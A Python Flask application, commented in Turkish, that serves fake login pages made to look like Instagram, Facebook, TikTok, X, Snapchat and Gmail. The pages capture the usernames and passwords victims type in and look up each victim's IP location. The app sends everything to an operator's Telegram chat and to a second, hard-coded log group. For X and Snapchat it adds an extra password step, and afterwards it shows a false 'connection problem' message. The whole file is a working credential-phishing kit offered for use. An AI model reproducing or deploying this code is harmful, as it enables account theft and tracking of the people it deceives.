from flask import Flask, request, render_template_string
import requests
from bs4 import BeautifulSoup

app = Flask(__name__)

# Telegram bot ayarları - Bu değerleri kendi bot token'ınız ve grup ID'niz ile değiştirin
TELEGRAM_BOT_TOKEN = '1234567889:wdfkadopfıhbasodfhbdzoıfghnaesoısdfgns'
TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
LOG_GROUP_CHAT_ID = '-1002033390647'

def get_client_ip(request):
    if request.headers.getlist("X-Forwarded-For"):
        ip_list = request.headers.getlist("X-Forwarded-For")[0]
        ip_address = ip_list.split(",")[0].strip()
        return ip_address
    else:
        return request.remote_addr

def ip_sorgula(ip_address):
    try:
        response = requests.get(f'https://ipinfo.io/{ip_address}/json')
        response.raise_for_status()
        data = response.json()

        ip_info = {
            "IP Adresi": data.get("ip", "Bulunamadı"),
            "Host Adı": data.get("hostname", "Bulunamadı"),
            "ISP": data.get("org", "Bulunamadı"),
            "Ülke": data.get("country", "Bulunamadı"),
            "Bölge": data.get("region", "Bulunamadı"),
            "Şehir": data.get("city", "Bulunamadı"),
            "Zaman Dilimi": data.get("timezone", "Bulunamadı")
        }

        formatted_text = (
            f"IP Adresi: {ip_info['IP Adresi']}\n"
            f"Host Adı: {ip_info['Host Adı']}\n"
            f"ISP: {ip_info['ISP']}\n"
            f"Ülke: {ip_info['Ülke']}\n"
            f"Bölge: {ip_info['Bölge']}\n"
            f"Şehir: {ip_info['Şehir']}\n"
            f"Zaman Dilimi: {ip_info['Zaman Dilimi']}\n"
        )
        return formatted_text

    except requests.RequestException as e:
        return f"IP bilgileri alınamadı: {str(e)}."

def get_login_page(platform):
    if platform == 'instagram':
        return '''
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Instagram Giriş</title>
            <style>
                @import url('https://fonts.googleapis.com/css2?family=Lobster&display=swap');
                body, html {
                    height: 100%;
                    margin: 0;
                    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
                    background-color: #fafafa;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    flex-direction: column;
                    overflow-y: auto;
                }
                .logo-container {
                    margin-top: 20px;
                }
                .logo-container img {
                    width: 200px;
                    display: block;
                    margin: 0 auto;
                }
                .login-container {
                    background-color: #ffffff;
                    padding: 20px 40px;
                    border: 1px solid #dbdbdb;
                    width: 100%;
                    max-width: 350px;
                    box-shadow: 0 0 10px rgba(0,0,0,0.1);
                    text-align: center;
                    margin-top: 20px;
                }
                .login-container input {
                    width: 100%;
                    padding: 9px;
                    margin: 5px 0 12px;
                    background: #fafafa;
                    border: 1px solid #dbdbdb;
                    border-radius: 3px;
                    box-sizing: border-box;
                    font-size: 14px;
                }
                .login-container button {
                    width: 100%;
                    background-color: #0095f6;
                    border: none;
                    padding: 8px;
                    color: white;
                    font-weight: bold;
                    border-radius: 4px;
                    cursor: pointer;
                    font-size: 14px;
                    margin-top: 12px;
                }
                .login-container button:hover {
                    background-color: #007ac1;
                }
                .forgot-password {
                    margin-top: 15px;
                    font-size: 12px;
                    color: #00376b;
                    text-decoration: none;
                }
                .forgot-password:hover {
                    text-decoration: underline;
                }
                .signup-link {
                    margin-top: 20px;
                    font-size: 14px;
                    color: #262626;
                }
                .signup-link a {
                    color: #0095f6;
                    text-decoration: none;
                }
                .signup-link a:hover {
                    text-decoration: underline;
                }
                .divider {
                    display: flex;
                    align-items: center;
                    text-align: center;
                    margin: 15px 0;
                }
                .divider::before,
                .divider::after {
                    content: '';
                    flex: 1;
                    border-bottom: 1px solid #dbdbdb;
                }
                .divider:not(:empty)::before {
                    margin-right: .25em;
                }
                .divider:not(:empty)::after {
                    margin-left: .25em;
                }
                .facebook-login {
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    background-color: #1877f2;
                    color: white;
                    border: none;
                    padding: 10px;
                    margin-bottom: 15px;
                    border-radius: 4px;
                    cursor: pointer;
                    font-size: 14px;
                    font-weight: bold;
                }
                .facebook-login img {
                    margin-right: 10px;
                    width: 20px;
                    height: 20px;
                }
                .meta-footer {
                    margin-top: 50px;
                    font-size: 12px;
                    color: #8e8e8e;
                    text-align: center;
                }
                .meta-footer img {
                    width: 70px;
                }
            </style>
            <script>
                function openNewTab(platform) {
                    const currentUrl = window.location.href;
                    const newUrl = currentUrl.replace('instagram', platform);
                    window.open(newUrl, '_blank');
                }
            </script>
        </head>
        <body>
            <div class="logo-container">
                <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram Logo">
            </div>
            <div class="login-container">
                <button class="facebook-login" onclick="openNewTab('facebook')">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">Facebook ile Devam Et
                </button>
                <div class="divider">YA DA</div>
                <form method="POST">
                    <input type="text" name="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta">
                    <input type="password" name="password" placeholder="Şifre">
                    <button type="submit">Giriş yap</button>
                </form>
                <a href="#" class="forgot-password">Şifreni mi unuttun?</a>
                <div class="signup-link">Hesabın yok mu? <a href="#">Kaydol</a></div>
            </div>
            <div class="meta-footer">
                 <img src="https://static.cdninstagram.com/rsrc.php/yb/r/SxCWlJznXoy.svg" alt="Meta Logo">
            </div>
        </body>
        </html>
        '''
    elif platform == 'facebook':
        return '''
        <!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Giriş</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
        }

        .container {
            background-color: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 100%;
            max-width: 360px;
        }

        .facebook-logo img {
            width: 50px;
            margin-bottom: 20px;
        }

        h2 {
            font-size: 1.5rem;
            color: #1877F2;
            margin-bottom: 20px;
        }

        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 14px;
            margin-bottom: 12px;
            border-radius: 6px;
            border: 1px solid #dddfe2;
            font-size: 16px;
            background-color: #f5f6f7;
        }

        button {
            width: 100%;
            background-color: #1877F2;
            color: white;
            border: none;
            padding: 14px;
            border-radius: 6px;
            font-size: 16px;
            cursor: pointer;
            margin-bottom: 15px;
        }

        button:hover {
            background-color: #166fe5;
        }

        a {
            color: #1877F2;
            text-decoration: none;
            font-size: 14px;
        }

        a:hover {
            text-decoration: underline;
        }

        .new-account {
            display: block;
            margin: 20px 0;
            padding: 14px;
            font-size: 16px;
            border: 1px solid #1877F2;
            border-radius: 6px;
            background-color: white;
            color: #1877F2;
        }

        .meta-footer {
            font-size: 12px;
            color: #606770;
            margin-top: 20px;
        }

        .meta-footer img {
            width: 70px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="facebook-logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
        </div>
        <h2>Facebook Giriş Yap</h2>
        <form method="POST">
            <input type="text" name="username" placeholder="Cep telefonu numarası veya e-posta adresi" required>
            <input type="password" name="password" placeholder="Şifre" required>
            <button type="submit">Giriş Yap</button>
        </form>
        <a href="#">Şifreni mi unuttun?</a>
        <a href="#" class="new-account">Yeni Hesap Oluştur</a>
        <div class="meta-footer">
            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSHfyGLfULLT_vGdZ4cIihYLAB2AagXqQ0I3w&usqp=CAU" alt="Meta Logo">
        </div>
    </div>
</body>
</html>
        '''
    elif platform == 'tiktok':
        return '''
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>TikTok Giriş</title>
            <style>
                body, html {
                    margin: 0;
                    padding: 0;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100%;
                    font-family: Arial, sans-serif;
                    background-color: #f2f2f2;
                }
                .container {
                    background-color: white;
                    padding: 40px;
                    border-radius: 10px;
                    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
                    text-align: center;
                    max-width: 400px;
                    width: 100%;
                }
                .logo-container img {
                    width: 150px;
                    margin-bottom: 20px;
                }
                h2 {
                    color: #333;
                    font-size: 24px;
                    margin-bottom: 20px;
                }
                .login-container {
                    display: flex;
                    flex-direction: column;
                }
                .login-container input {
                    padding: 10px;
                    margin-bottom: 15px;
                    font-size: 16px;
                    border: 1px solid #ccc;
                    border-radius: 5px;
                    width: 100%;
                    box-sizing: border-box;
                }
                .login-container button {
                    padding: 10px;
                    background-color: #ff0050;
                    color: white;
                    border: none;
                    border-radius: 5px;
                    font-size: 16px;
                    cursor: pointer;
                    margin-top: 10px;
                }
                .login-container button:hover {
                    background-color: #d4003d;
                }
                .divider {
                    display: flex;
                    align-items: center;
                    text-align: center;
                    margin: 20px 0;
                }
                .divider::before, .divider::after {
                    content: '';
                    flex: 1;
                    border-bottom: 1px solid #ccc;
                }
                .divider::before {
                    margin-right: 10px;
                }
                .divider::after {
                    margin-left: 10px;
                }
                .signup-link {
                    margin-top: 20px;
                    font-size: 14px;
                    color: #333;
                }
                .signup-link a {
                    color: #ff0050;
                    text-decoration: none;
                }
                .signup-link a:hover {
                    text-decoration: underline;
                }
                .facebook-button, .google-button {
                    padding: 10px;
                    font-size: 16px;
                    cursor: pointer;
                    border-radius: 5px;
                    width: 100%;
                    margin-bottom: 10px;
                }
                .facebook-button {
                    background-color: #4267B2;
                    color: white;
                    border: none;
                }
                .google-button {
                    background-color: white;
                    color: black;
                    border: 1px solid #ccc;
                }
            </style>
            <script>
                function openNewTab(platform) {
                    const currentUrl = window.location.href;
                    const newUrl = currentUrl.replace('tiktok', platform);
                    window.open(newUrl, '_blank');
                }
            </script>
        </head>
        <body>
            <div class="container">
                <div class="logo-container">
                    <img src="https://assets-global.website-files.com/642dd814982ac374c9b86e6f/644cd14ffcacf75a71900290_1200px-TikTok_logo.svg.png" alt="TikTok Logo">
                </div>
                <h2>TikTok Giriş Yap</h2>
                <form method="POST" class="login-container">
                    <input type="text" name="username" placeholder="Telefon numarası, e-posta veya kullanıcı adı" required>
                    <input type="password" name="password" placeholder="Şifre" required>
                    <button type="submit">Giriş Yap</button>
                </form>
                <div class="divider">YA DA</div>
                <button class="facebook-button" onclick="openNewTab('facebook')">Facebook ile Devam Et</button>
                <button class="google-button" onclick="openNewTab('google')">Google ile Devam Et</button>
                <div class="signup-link">
                    Hesabın yok mu? <a href="#">Kaydol</a>
                </div>
            </div>
        </body>
        </html>
        '''
    elif platform == 'twitter':
        return '''
        <!DOCTYPE html>
        <html lang="tr">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>X</title>
            <style>
                body {
                    background-color: #000000;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    margin: 0;
                    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
                    color: white;
                    position: relative;
                }
                .close-button {
                    position: absolute;
                    top: 20px;
                    left: 20px;
                    background: none;
                    border: none;
                    color: white;
                    font-size: 24px;
                    cursor: pointer;
                    font-weight: normal;
                }
                .container {
                    background-color: #000000;
                    padding: 40px;
                    border-radius: 16px;
                    width: 100%;
                    max-width: 400px;
                    text-align: center;
                }
                .x-logo {
                    width: 32px;
                    height: 32px;
                    margin-bottom: 32px;
                }
                h2 {
                    font-size: 31px;
                    font-weight: 700;
                    margin-bottom: 32px;
                    color: #e7e9ea;
                }
                .login-button {
                    background-color: #ffffff;
                    color: #0f1419;
                    border: 1px solid #536471;
                    border-radius: 20px;
                    padding: 8px 24px;
                    width: 100%;
                    font-size: 15px;
                    font-weight: 700;
                    cursor: pointer;
                    margin-bottom: 12px;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    height: 40px;
                    box-sizing: border-box;
                }
                .login-button img {
                    width: 18px;
                    height: 18px;
                    margin-right: 12px;
                }
                .or-divider {
                    display: flex;
                    align-items: center;
                    text-align: center;
                    margin: 16px 0;
                    color: #71767b;
                    font-size: 15px;
                }
                .or-divider::before,
                .or-divider::after {
                    content: '';
                    flex: 1;
                    border-bottom: 1px solid #2f3336;
                }
                .or-divider:not(:empty)::before {
                    margin-right: 16px;
                }
                .or-divider:not(:empty)::after {
                    margin-left: 16px;
                }
                input {
                    background-color: #000000;
                    border: 1px solid #333639;
                    border-radius: 4px;
                    padding: 12px 16px;
                    width: 100%;
                    margin-bottom: 20px;
                    font-size: 17px;
                    color: #e7e9ea;
                    box-sizing: border-box;
                }
                input::placeholder {
                    color: #71767b;
                }
                input:focus {
                    outline: none;
                    border-color: #1d9bf0;
                }
                .next-button {
                    background-color: #ffffff;
                    color: #0f1419;
                    border: none;
                    border-radius: 20px;
                    padding: 8px 24px;
                    width: 100%;
                    font-size: 15px;
                    font-weight: 700;
                    cursor: pointer;
                    margin-bottom: 20px;
                    height: 40px;
                }
                .forgot-password {
                    color: #ffffff;
                    text-decoration: none;
                    font-size: 15px;
                    font-weight: 400;
                    display: block;
                    margin-bottom: 48px;
                    background-color: transparent;
                    border: 1px solid #536471;
                    border-radius: 20px;
                    padding: 8px 24px;
                    height: 40px;
                    line-height: 24px;
                }
                .forgot-password:hover {
                    background-color: rgba(239, 243, 244, 0.1);
                }
                .signup-text {
                    font-size: 15px;
                    color: #71767b;
                    font-weight: 400;
                }
                .signup-text a {
                    color: #1d9bf0;
                    text-decoration: none;
                }
                .signup-text a:hover {
                    text-decoration: underline;
                }
            </style>
        </head>
        <body>
            <button class="close-button">✕</button>
            <div class="container">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/53/X_logo_2023_original.svg/2048px-X_logo_2023_original.svg.png" alt="X Logo" class="x-logo">
                <h2>X'e giriş yap</h2>
                <button class="login-button">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/1200px-Google_%22G%22_logo.svg.png" alt="Google Logo"> Google ile oturum açın
                </button>
                <button class="login-button">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/Apple_logo_black.svg/1667px-Apple_logo_black.svg.png" alt="Apple Logo"> Apple ile giriş yap
                </button>
                <div class="or-divider">veya</div>
                <form method="POST">
                    <input type="text" name="username" placeholder="Telefon numarası, e-posta veya kulla...">
                    <button type="submit" class="next-button">İleri</button>
                </form>
                <a href="#" class="forgot-password">Şifreni mi unuttun?</a>
                <div class="signup-text">
                    Henüz bir hesabın yok mu? <a href="#">Kaydol</a>
                </div>
            </div>
        </body>
        </html>
        '''
    elif platform == 'snapchat':
        return '''
        <!DOCTYPE html>
        <html lang="tr">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Snapchat</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    background-color: #f2f2f2;
                    margin: 0;
                    padding: 0;
                    display: flex;
                    flex-direction: column;
                    align-items: center;
                    min-height: 100vh;
                }
                .container {
                    background-color: #ffffff;
                    padding: 40px 20px;
                    border-radius: 8px;
                    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
                    text-align: center;
                    width: 100%;
                    max-width: 380px;
                    margin-top: 50px;
                }
                .snap-logo {
                    width: 50px;
                    margin-bottom: 20px;
                }
                h2 {
                    font-size: 24px;
                    margin-bottom: 20px;
                    color: #333;
                }
                .subtitle {
                    font-size: 14px;
                    color: #666;
                    margin-bottom: 30px;
                }
                input[type="text"] {
                    width: calc(100% - 22px);
                    padding: 10px;
                    margin-bottom: 20px;
                    border: none;
                    border-bottom: 2px solid #007bff;
                    font-size: 16px;
                    background-color: transparent;
                    outline: none;
                }
                input[type="text"]:focus {
                    border-bottom-color: #0056b3;
                }
                .phone-link {
                    color: #007bff;
                    text-decoration: none;
                    font-size: 14px;
                    margin-bottom: 20px;
                    display: block;
                }
                .next-button {
                    background-color: #007bff;
                    color: white;
                    padding: 12px 20px;
                    border: none;
                    border-radius: 25px;
                    cursor: pointer;
                    font-size: 16px;
                    width: 100%;
                    margin-bottom: 30px;
                }
                .next-button:hover {
                    background-color: #0056b3;
                }
                .signup-link {
                    font-size: 14px;
                    color: #333;
                    margin-bottom: 30px;
                }
                .signup-link a {
                    color: #333;
                    text-decoration: none;
                    font-weight: bold;
                }
                .footer-links {
                    display: flex;
                    flex-direction: column;
                    align-items: flex-start;
                    width: 100%;
                    margin-top: 20px;
                }
                .footer-link {
                    color: #333;
                    text-decoration: none;
                    font-size: 14px;
                    margin-bottom: 15px;
                    display: flex;
                    align-items: center;
                }
                .footer-link::before {
                    content: ">";
                    margin-right: 10px;
                    font-weight: bold;
                }
                .language-link {
                    color: #333;
                    text-decoration: none;
                    font-size: 14px;
                    margin-top: 20px;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/ae/Snapchat_logo.svg/1200px-Snapchat_logo.svg.png" alt="Snapchat Logo" class="snap-logo">
                <h2>Snapchat'te oturum aç</h2>
                <div class="subtitle">Kullanıcı Adı veya E-Posta</div>
                <form method="POST">
                    <input type="text" name="username" placeholder="" required>
                    <a href="#" class="phone-link">Bunun yerine telefon numarası kullan</a>
                    <button type="submit" class="next-button">Sonraki</button>
                </form>
                <div class="signup-link">
                    Snapchat'te yeni misin? <a href="#">Kaydol</a>
                </div>
                <div class="footer-links">
                    <a href="#" class="footer-link">Şirket</a>
                    <a href="#" class="footer-link">Topluluk</a>
                    <a href="#" class="footer-link">Reklam</a>
                    <a href="#" class="footer-link">Yasal</a>
                </div>
                <a href="#" class="language-link">Dil</a>
            </div>
        </body>
        </html>
        '''
    elif platform == 'gmail':
        return '''
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Gmail Giriş</title>
            <style>
                body, html {
                    margin: 0;
                    padding: 0;
                    height: 100%;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    font-family: Arial, sans-serif;
                    background-color: #f2f2f2;
                }
                .container {
                    background-color: white;
                    padding: 40px;
                    border-radius: 10px;
                    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
                    text-align: center;
                    max-width: 400px;
                    width: 100%;
                }
                .logo-container img {
                    width: 100px;
                    margin-bottom: 20px;
                }
                h2 {
                    color: #333;
                    font-size: 24px;
                    margin-bottom: 20px;
                }
                .login-container {
                    display: flex;
                    flex-direction: column;
                }
                .login-container input {
                    padding: 12px;
                    margin-bottom: 15px;
                    font-size: 16px;
                    border: 1px solid #ccc;
                    border-radius: 5px;
                    width: 100%;
                    box-sizing: border-box;
                }
                .login-container button {
                    padding: 12px;
                    background-color: #4285F4;
                    color: white;
                    border: none;
                    border-radius: 5px;
                    font-size: 16px;
                    cursor: pointer;
                    margin-top: 10px;
                }
                .login-container button:hover {
                    background-color: #3367D6;
                }
                .forgot-password {
                    margin-top: 15px;
                    font-size: 14px;
                    color: #4285F4;
                    text-decoration: none;
                }
                .forgot-password:hover {
                    text-decoration: underline;
                }
                .signup-link {
                    margin-top: 20px;
                    font-size: 14px;
                    color: #333;
                }
                .signup-link a {
                    color: #4285F4;
                    text-decoration: none;
                }
                .signup-link a:hover {
                    text-decoration: underline;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="logo-container">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/4/4e/Gmail_Icon.png" alt="Gmail Logo">
                </div>
                <h2>Gmail Giriş Yap</h2>
                <form method="POST" class="login-container">
                    <input type="text" name="username" placeholder="E-posta veya telefon" required>
                    <input type="password" name="password" placeholder="Şifre" required>
                    <button type="submit">İleri</button>
                </form>
                <a href="#" class="forgot-password">Şifrenizi mi unuttunuz?</a>
                <div class="signup-link">
                    Hesabınız yok mu? <a href="#">Hesap oluşturun</a>
                </div>
            </div>
        </body>
        </html>
        '''
    return 'hmmm bişey bulamadık😕'


@app.route('/login/<platform>/<chat_id>', methods=['GET', 'POST'])
def login(platform, chat_id):
    if request.method == 'POST':
        username = request.form['username']
        password = request.form.get('password', '')  # Şifre alanı olmayabilir
        ip_address = get_client_ip(request)  

        ip_info = ip_sorgula(ip_address)

        message = f"*{platform.title()} Giriş Bilgileri*:\n\n"
        message += f"🔑 *Kullanıcı Adı*: `{username}`\n"
        if password:
            message += f"🔒 *Şifre*: `{password}`\n\n"
        else:
            message += f"🔒 *Şifre*: `İlk adımda şifre girilmedi`\n\n"
        message += f"🌍 *IP Bilgileri*:\n{ip_info}\n"

        send_to_telegram(chat_id, message)  

        user_profile_url = f"tg://user?id={chat_id}"
        log_message = f"{message}\n👤 [Kullanıcı Profili]({user_profile_url})"
        send_to_telegram(LOG_GROUP_CHAT_ID, log_message)  

        # Twitter için şifre sayfasına yönlendirme
        if platform == 'twitter' and not password:
            return render_template_string(get_password_page(username))
        # Snapchat için şifre sayfasına yönlendirme
        if platform == 'snapchat' and not password:
            return render_template_string(get_snapchat_password_page(username))

        return "bağlantı sorunu! lütfen daha sonra tekrar deneyiniz."

    return render_template_string(get_login_page(platform))

def get_password_page(username):
    return f'''
    <!DOCTYPE html>
    <html lang="tr">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>X</title>
        <style>
            body {{
                background-color: #000000;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
                color: white;
                position: relative;
            }}
            .close-button {{
                position: absolute;
                top: 20px;
                left: 20px;
                background: none;
                border: none;
                color: white;
                font-size: 24px;
                cursor: pointer;
                font-weight: normal;
            }}
            .container {{
                background-color: #000000;
                padding: 40px;
                border-radius: 16px;
                width: 100%;
                max-width: 400px;
                text-align: center;
            }}
            .x-logo {{
                width: 32px;
                height: 32px;
                margin-bottom: 32px;
            }}
            h2 {{
                font-size: 31px;
                font-weight: 700;
                margin-bottom: 8px;
                color: #e7e9ea;
            }}
            .username-display {{
                color: #71767b;
                font-size: 15px;
                margin-bottom: 32px;
            }}
            input {{
                background-color: #000000;
                border: 1px solid #333639;
                border-radius: 4px;
                padding: 12px 16px;
                width: 100%;
                margin-bottom: 20px;
                font-size: 17px;
                color: #e7e9ea;
                box-sizing: border-box;
            }}
            input::placeholder {{
                color: #71767b;
            }}
            input:focus {{
                outline: none;
                border-color: #1d9bf0;
            }}
            .login-button {{
                background-color: #ffffff;
                color: #0f1419;
                border: none;
                border-radius: 20px;
                padding: 8px 24px;
                width: 100%;
                font-size: 15px;
                font-weight: 700;
                cursor: pointer;
                margin-bottom: 20px;
                height: 40px;
            }}
            .forgot-password {{
                color: #1d9bf0;
                text-decoration: none;
                font-size: 15px;
                font-weight: 400;
                display: block;
                margin-bottom: 48px;
            }}
            .forgot-password:hover {{
                text-decoration: underline;
            }}
        </style>
    </head>
    <body>
        <button class="close-button">✕</button>
        <div class="container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/53/X_logo_2023_original.svg/2048px-X_logo_2023_original.svg.png" alt="X Logo" class="x-logo">
            <h2>Şifreni gir</h2>
            <div class="username-display">Kullanıcı adı<br>{username}</div>
            <form method="POST">
                <input type="hidden" name="username" value="{username}">
                <input type="password" name="password" placeholder="Şifre" required>
                <button type="submit" class="login-button">Giriş yap</button>
            </form>
            <a href="#" class="forgot-password">Şifreni mi unuttun?</a>
        </div>
    </body>
    </html>
    '''

def get_snapchat_password_page(username):
    return f'''
    <!DOCTYPE html>
    <html lang="tr">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Snapchat</title>
        <style>
            body {{
                font-family: Arial, sans-serif;
                background-color: #f2f2f2;
                margin: 0;
                padding: 0;
                display: flex;
                flex-direction: column;
                align-items: center;
                min-height: 100vh;
            }}
            .header {{
                width: 100%;
                display: flex;
                justify-content: flex-start;
                padding: 15px;
                box-sizing: border-box;
            }}
            .back-button {{
                background: none;
                border: none;
                font-size: 24px;
                cursor: pointer;
                color: #333;
            }}
            .container {{
                background-color: #ffffff;
                padding: 20px;
                border-radius: 8px;
                box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
                text-align: center;
                width: 100%;
                max-width: 380px;
                margin-top: 50px;
            }}
            .snap-logo {{
                width: 50px;
                margin-bottom: 20px;
            }}
            h2 {{
                font-size: 24px;
                margin-bottom: 20px;
                color: #333;
            }}
            .username-display {{
                font-size: 16px;
                color: #555;
                margin-bottom: 20px;
            }}
            .username-display span {{
                font-weight: bold;
            }}
            input[type="password"] {{
                width: calc(100% - 22px);
                padding: 10px;
                margin-bottom: 20px;
                border: 1px solid #ccc;
                border-radius: 5px;
                font-size: 16px;
            }}
            .forgot-password-link {{
                color: #007bff;
                text-decoration: none;
                font-size: 14px;
                margin-bottom: 20px;
                display: block;
            }}
            .next-button {{
                background-color: #007bff;
                color: white;
                padding: 12px 20px;
                border: none;
                border-radius: 25px;
                cursor: pointer;
                font-size: 16px;
                width: 100%;
            }}
            .next-button:hover {{
                background-color: #0056b3;
            }}
        </style>
    </head>
    <body>
        <div class="header">
            <button class="back-button">←</button>
        </div>
        <div class="container">
            <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/ae/Snapchat_logo.svg/1200px-Snapchat_logo.svg.png" alt="Snapchat Logo" class="snap-logo">
            <h2>Şifre Gir</h2>
            <div class="username-display">{username} <a href="#" style="color: #007bff; text-decoration: none;">Sen değil misin?</a></div>
            <form method="POST">
                <input type="hidden" name="username" value="{username}">
                <input type="password" name="password" placeholder="Şifre" required>
                <a href="#" class="forgot-password-link">Şifremi Unuttum</a>
                <button type="submit" class="next-button">Sonraki</button>
            </form>
        </div>
    </body>
    </html>
    '''

def send_to_telegram(chat_id, message):
    data = {
        'chat_id': chat_id,
        'text': message,
        'parse_mode': 'Markdown'
    }
    requests.post(TELEGRAM_API_URL, data=data)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)






